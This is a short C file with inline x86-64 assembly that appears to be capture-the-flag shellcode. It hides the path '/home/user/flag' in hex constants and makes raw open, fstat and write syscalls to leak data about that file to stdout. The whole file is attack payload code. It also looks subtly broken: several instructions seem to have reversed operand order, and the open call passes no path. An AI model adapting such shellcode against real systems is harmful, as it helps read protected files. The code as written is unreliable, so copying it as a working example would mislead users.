#include <unistd.h>
#include <stdint.h>
#include <syscall.h>
#include <sys/stat.h>
void sc() {
    uint32_t z = 0;
    uint32_t x = 16;

    uint32_t r = 0;
    uint32_t d = 1;

    struct stat stat_out;

    asm volatile (
      "movabs %%rax, 0x0067616c662f7265\n\t"
      "push %%rax\n\t"
      "movabs %%rax, 0x73752f656d6f682f\n\t"
      "push %%rax"
      :
      :
      : "rax", "memory");
    asm volatile (
      "mov %%edi, %%esp\n\t"
      "syscall"
      : "=a"(r)
      : "a"(__NR_open), "S"(z), "d"(z)
      : "edi", "memory");
    asm volatile (
      "syscall"
      : "=a"(r)
      : "a"(__NR_fstat), "D"(r), "S"(&stat_out)
      : "memory");
    asm volatile (
      "syscall"
      : "=a"(r)
      : "a"(__NR_write), "D"(d), "S"(&stat_out), "d"(sizeof(struct stat))
      : "memory");
}

